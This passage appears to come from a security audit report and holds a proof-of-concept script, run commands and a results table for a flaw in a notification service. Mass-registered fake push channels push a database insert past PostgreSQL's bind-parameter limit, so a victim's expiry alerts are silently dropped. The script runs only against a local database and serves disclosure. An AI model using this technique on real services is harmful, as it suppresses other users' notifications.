const baselineMessage = {
  id: 'baseline-msg', timestamp: new Date(), attempts: 1,
  body: producerEventByStage.get('7d'),
  ack() { baselineCounters.ack++ },
  retry() { baselineCounters.retry++ },
}
await handleEventIngestionQueue({
  queue: 'app-api-worker-event-ingestion',
  messages: [baselineMessage], ackAll() {}, retryAll() {},
}, env)
const baselineRows = await pool.query(\`
  select
    (select count(*)::int from notifications where user_id = $1) as notifications,
    (select count(*)::int from notification_deliveries d
       join notifications n on n.id = d.notification_id
       where n.user_id = $1 and d.channel = 'email') as email_deliveries
\`, [VICTIM_ID])
assert.deepEqual(baselineRows.rows[0], { notifications: 1, email_deliveries: 1 })
assert.deepEqual(baselineCounters, { ack: 1, retry: 0 })
assert.equal(queueSendCount, 1)
await pool.query('truncate table notification_deliveries, notifications')
queueSendCount = 0

const poisonRequestStart = observedRequests.length
for (let i = 0; i < CHANNEL_COUNT; i++) {
  const response = await app.request('/notifications/channels/push', {
    method: 'POST', headers: authHeaders,
    body: JSON.stringify({
      endpoint: 'https://fcm.googleapis.com/fcm/send/fake-' + i,
      keys: { auth: 'x', p256dh: 'y' },
    }),
  }, env)
  assert.equal(response.status, 201)
}

for (let i = 0; i < EVENT_COUNT; i++) {
  const response = await app.request('/favorites/batch-' + i + '.eth', {
    method: 'PUT', headers: authHeaders,
  }, env)
  assert.equal(response.status, 200)
}

const preferenceResponse = await app.request('/notifications/preferences', {
  method: 'PATCH', headers: authHeaders,
  body: JSON.stringify({ ownedNameExpiry: true, favouritedNameExpiry: true }),
}, env)
assert.equal(preferenceResponse.status, 200)

const setup = await pool.query(
  "select " +
    "(select count(*)::int from user_channels where user_id = $1 and channel = 'push' and status = 'verified') as channels, " +
    "(select count(*)::int from favorites where user_id = $1) as favorites, " +
    "(select favourited_name_expiry from user_notification_settings where user_id = $1) as enabled",
  [ATTACKER_ID],
)
assert.deepEqual(setup.rows[0], { channels: CHANNEL_COUNT, favorites: EVENT_COUNT, enabled: true })

function eventBodiesForStage(stage) {
  if (MODE === 'deterministic') {
    const body = producerEventByStage.get(stage)
    assert.ok(body)
    return [body]
  }
  assert.equal(stage, '7d')
  return Array.from({ length: EVENT_COUNT }, (_, i) => i === 0
    ? producerEventByStage.get('7d')
    : ({
        type: 'name_expiring',
        name: 'batch-' + i + '.eth',
        expiryDate: 1_800_000_000 + i,
        stage: '7d',
        owner: UNREGISTERED_OWNER_ADDRESS,
        includeFavorites: true,
      }))
}

function makeStageMessages(stage, attempts) {
  return eventBodiesForStage(stage).map((body, index) => {
    const counters = { ack: 0, retry: 0 }
    return {
      id: 'msg-' + stage + '-' + index,
      timestamp: new Date(), attempts: attempts + 1, body,
      ack() { counters.ack++ },
      retry() { counters.retry++ },
      counters,
    }
  })
}
const makeBatch = messages => ({
  queue: 'app-api-worker-event-ingestion', messages,
  ackAll() {}, retryAll() {},
})

let acknowledgedRetryMessages = 0
for (const [stageIndex, stage] of POISONED_STAGES.entries()) {
  const firstMessages = makeStageMessages(stage, 0)
  await handleEventIngestionQueue(makeBatch(firstMessages), env)
  const afterFirst = await pool.query(
    'select ' +
      '(select count(*)::int from notifications) as notifications, ' +
      '(select count(*)::int from notification_deliveries) as deliveries, ' +
      '(select count(*)::int from notifications where user_id = $1) as victim_notifications',
    [VICTIM_ID],
  )
  assert.deepEqual(afterFirst.rows[0], {
    notifications: (stageIndex + 1) * NOTIFICATION_ROWS_PER_STAGE,
    deliveries: 0,
    victim_notifications: stageIndex + 1,
  })
  assert.ok(firstMessages.every(message => message.counters.retry === 1 && message.counters.ack === 0))
  assert.equal(
    observedDbErrors.filter(error => error.parameterCount === BIND_PARAMETERS_PER_STAGE).length,
    stageIndex + 1,
  )
  assert.equal(queueSendCount, 0)

  const retryMessages = makeStageMessages(stage, 1)
  const retryGroups = MODE === 'efficient'
    ? [retryMessages.slice(0, 17), retryMessages.slice(17)]
    : [retryMessages]
  for (const group of retryGroups) {
    await handleEventIngestionQueue(makeBatch(group), env)
  }
  assert.ok(retryMessages.every(message => message.counters.ack === 1 && message.counters.retry === 0))
  acknowledgedRetryMessages += retryMessages.length
}
const expectedRetryMessages = POISONED_STAGES.length * EVENT_COUNT
const allRetryMessagesAcked = acknowledgedRetryMessages === expectedRetryMessages
assert.equal(allRetryMessagesAcked, true)

const finalRows = await pool.query(
  'select ' +
    '(select count(*)::int from notifications) as notifications, ' +
    '(select count(*)::int from notification_deliveries) as deliveries, ' +
    '(select count(*)::int from notifications where user_id = $1) as victim_notifications, ' +
    '(select count(*)::int from notification_deliveries d join notifications n on n.id = d.notification_id where n.user_id = $1) as victim_deliveries',
  [VICTIM_ID],
)
assert.deepEqual(finalRows.rows[0], {
  notifications: POISONED_STAGES.length * NOTIFICATION_ROWS_PER_STAGE,
  deliveries: 0,
  victim_notifications: POISONED_STAGES.length,
  victim_deliveries: 0,
})
assert.equal(queueSendCount, 0)

const bindFailure = observedDbErrors.find(error => error.parameterCount === BIND_PARAMETERS_PER_STAGE)
assert.ok(bindFailure, 'Expected real PostgreSQL Bind failure at ' + BIND_PARAMETERS_PER_STAGE + ' parameters')
assert.equal(bindFailure.code, '08P01')
assert.match(bindFailure.message, /bind message/i)
const poisonNotificationInserts = observedRequests
  .slice(poisonRequestStart)
  .filter(request => request.queryPrefix.startsWith('insert into "notifications"'))
const expectedInsertRows = MODE === 'efficient'
  ? [51, 0, 0]
  : [2, 0, 2, 0, 2, 0]
assert.deepEqual(poisonNotificationInserts.map(request => request.rowCount), expectedInsertRows)
const retryNotificationInsertRowCounts = MODE === 'efficient'
  ? poisonNotificationInserts.slice(1).map(request => request.rowCount)
  : poisonNotificationInserts
      .filter((_request, index) => index % 2 === 1)
      .map(request => request.rowCount)
assert.deepEqual(
  retryNotificationInsertRowCounts,
  MODE === 'efficient' ? [0, 0] : [0, 0, 0],
)
const newNotificationRowsReturnedAcrossRetries = retryNotificationInsertRowCounts
  .reduce((sum, rowCount) => sum + rowCount, 0)
const deliveryInsertRequests = observedRequests
  .slice(poisonRequestStart)
  .filter(request => request.queryPrefix.startsWith('insert into "notification_deliveries"'))
const deliveryInsertAttempts = deliveryInsertRequests.length
assert.equal(deliveryInsertAttempts, POISONED_STAGES.length)
assert.equal(
  observedDbErrors.filter(error => error.parameterCount === BIND_PARAMETERS_PER_STAGE).length,
  POISONED_STAGES.length,
)
const deliveryInsertRetriedAfterIdempotencyConflict =
  deliveryInsertAttempts > POISONED_STAGES.length
assert.equal(deliveryInsertRetriedAfterIdempotencyConflict, false)

console.log(JSON.stringify({
  database: {
    engine: 'local PostgreSQL ' + serverVersion + ' behind installed Neon HTTP client',
    productGetDatabaseUsed: true,
    deployedNeonServiceUsed: false,
    neonHttpBoundary: 'custom loopback JSON-to-node-postgres adapter',
    fullPublicHonoAppUsed: true,
    bindFailureCode: bindFailure.code,
    bindFailureMessage: bindFailure.message,
    failedRequestBodyBytes: observedRequests.find(request => request.parameterCount === BIND_PARAMETERS_PER_STAGE)?.bodyBytes,
  },
  producer: {
    productRunExpiryDiscoveryCronUsed: true,
    deployedIndexerRequests: 0,
    capturedStages: producerCapture.events.map(event => event.stage),
    capturedStagesFedToHandler: POISONED_STAGES,
  },
  baseline: {
    victimEmailDeliveryRows: baselineRows.rows[0].email_deliveries,
    emailQueueJobsSent: 1,
    messageAcked: baselineCounters.ack === 1,
  },
  scenario: {
    mode: MODE,
    attackerRecipientEventsPerStage: EVENT_COUNT,
    consumerGroupingRequired: MODE === 'efficient',
    publicPushChannels: setup.rows[0].channels,
    favorites: setup.rows[0].favorites,
    stages: POISONED_STAGES,
    committedNotificationRows: finalRows.rows[0].notifications,
    deliveryRowsAttemptedPerStage: DELIVERY_ROWS_PER_STAGE,
    bindParametersPerStage: BIND_PARAMETERS_PER_STAGE,
    retryNotificationInsertRowCounts,
    newNotificationRowsReturnedAcrossRetries,
    deliveryInsertAttempts,
    deliveryInsertRetriedAfterIdempotencyConflict,
    victimDeliveryRows: finalRows.rows[0].victim_deliveries,
    allRetryMessagesAcked,
    externalQueueJobsSent: queueSendCount,
  },
}, null, 2))

await pool.end()
`
const { FORCE_COLOR: _forceColor, ...cleanEnv } = process.env
cleanEnv.NO_COLOR = '1'
cleanEnv.NODE_NO_WARNINGS = '1'

const executable = (path) => {
  try { accessSync(path, constants.X_OK); return true } catch { return false }
}
const isPostgres17Bin = (dir) => {
  if (!executable(join(dir, 'initdb')) || !executable(join(dir, 'pg_ctl')) || !executable(join(dir, 'postgres'))) return false
  const version = spawnSync(join(dir, 'postgres'), ['--version'], { encoding: 'utf8' })
  return version.status === 0 && /\b17\./.test(version.stdout ?? '')
}
const candidateDirs = [
  process.env.POSTGRES_BIN,
  '/opt/homebrew/opt/postgresql@17/bin',
  '/usr/local/opt/postgresql@17/bin',
  '/usr/lib/postgresql/17/bin',
  ...String(process.env.PATH ?? '').split(delimiter),
].filter(Boolean)
const postgresBin = [...new Set(candidateDirs)].find(isPostgres17Bin)

const isExactLoopbackPostgresUrl = (rawUrl) => {
  try {
    const parsed = new URL(rawUrl)
    const hostname = parsed.hostname.toLowerCase()
    return ['postgres:', 'postgresql:'].includes(parsed.protocol) &&
      ['127.0.0.1', '::1', '[::1]'].includes(hostname) &&
      parsed.search === '' && parsed.hash === ''
  } catch {
    return false
  }
}

let ephemeral
if (cleanEnv.LEAD011_PG_URL && !isExactLoopbackPostgresUrl(cleanEnv.LEAD011_PG_URL)) {
  writeSync(2, 'Safety: LEAD011_PG_URL must use an exact loopback IP literal and no query/fragment overrides.\n')
  process.exit(2)
}
if (cleanEnv.LEAD011_PG_URL && cleanEnv.LEAD011_ALLOW_DROP_PUBLIC !== '1') {
  writeSync(2, 'Safety: a supplied LEAD011_PG_URL is wiped. Use only a disposable local database and set LEAD011_ALLOW_DROP_PUBLIC=1.\n')
  process.exit(2)
}
if (!cleanEnv.LEAD011_PG_URL) {
  if (!postgresBin) {
    writeSync(2, 'PostgreSQL tools not found. Install PostgreSQL 17, set POSTGRES_BIN, or set LEAD011_PG_URL to a disposable local database.\n')
    process.exit(2)
  }
  const root = mkdtempSync(join(tmpdir(), 'lead011-postgres-'))
  const data = join(root, 'data')
  const socketDir = join(root, 'socket')
  mkdirSync(socketDir)
  const server = createServer()
  await new Promise((resolve, reject) => {
    server.once('error', reject)
    server.listen(0, '127.0.0.1', resolve)
  })
  const port = server.address().port
  await new Promise((resolve, reject) => server.close(error => error ? reject(error) : resolve()))
  const init = spawnSync(join(postgresBin, 'initdb'), [
    '-D', data, '-A', 'trust', '--no-locale', '-E', 'UTF8',
  ], { encoding: 'utf8' })
  if (init.status !== 0) {
    writeSync(2, init.stdout ?? ''); writeSync(2, init.stderr ?? '')
    rmSync(root, { recursive: true, force: true })
    process.exit(init.status ?? 2)
  }
  const options = `-F -p ${port} -k ${socketDir} -c listen_addresses=127.0.0.1`
  const start = spawnSync(join(postgresBin, 'pg_ctl'), [
    '-D', data, '-l', join(root, 'postgres.log'), '-o', options, '-w', 'start',
  ], { encoding: 'utf8' })
  if (start.status !== 0) {
    writeSync(2, start.stdout ?? ''); writeSync(2, start.stderr ?? '')
    rmSync(root, { recursive: true, force: true })
    process.exit(start.status ?? 2)
  }
  cleanEnv.LEAD011_PG_URL = `postgresql://127.0.0.1:${port}/postgres`
  ephemeral = { root, data, postgresBin }
}

let result
try {
  result = spawnSync(process.execPath, [
    '--experimental-test-module-mocks',
    '--import', tsxLoader,
    '--input-type=module', '--eval', source,
  ], { cwd: workerDir, env: cleanEnv, encoding: 'utf8', maxBuffer: 20 * 1024 * 1024 })
} finally {
  if (ephemeral) {
    spawnSync(join(ephemeral.postgresBin, 'pg_ctl'), [
      '-D', ephemeral.data, '-m', 'immediate', '-w', 'stop',
    ], { encoding: 'utf8' })
    rmSync(ephemeral.root, { recursive: true, force: true })
  }
}
writeSync(1, result?.stdout ?? '')
writeSync(2, result?.stderr ?? '')
process.exit(result?.status ?? 1)
```

### Run both modes

{% tabs %}
{% tab title="Grouping-independent, one event per stage" %}

```sh
node audit_workspace/pocs/lead-011/postgres-neon-complete-poc.mjs
```

{% endtab %}

{% tab title="Configured-full-batch form, with 17/33 retry rebatching" %}

```sh
LEAD011_MODE=efficient node audit_workspace/pocs/lead-011/postgres-neon-complete-poc.mjs
```

{% endtab %}
{% endtabs %}

### Captured result summary

Both commands exited `0` on PostgreSQL 17.11. Printed counters and source assertions agree:

| Observed field                           |             Deterministic mode |                Efficient mode |
| ---------------------------------------- | -----------------------------: | ----------------------------: |
| Deployed Neon/indexer requests           |                              0 |                             0 |
| Producer-captured stages fed to consumer |          `7d`, `1d`, `expired` |                          `7d` |
| Clean victim email delivery rows/jobs    |                          1 / 1 |                         1 / 1 |
| Public fake push channels / favorites    |                     10,922 / 1 |                      219 / 50 |
| Consumer grouping required               |                             No |   Yes (configured full batch) |
| Delivery rows attempted per stage        |                         10,923 |                        10,951 |
| Bind parameters per failing statement    |                         65,538 |                        65,706 |
| PostgreSQL error code                    |                        `08P01` |                       `08P01` |
| Notification rows committed              |          6 across three stages |                            51 |
| Delivery rows committed                  |                              0 |                             0 |
| Retry notification-insert row counts     |                    `[0, 0, 0]` |                      `[0, 0]` |
| Delivery-insert attempts                 | 3 first attempts; 0 on retries | 1 first attempt; 0 on retries |
| Victim delivery rows / provider jobs     |                          0 / 0 |                         0 / 0 |
| Demonstrated retry messages acknowledged |                            All |                           All |
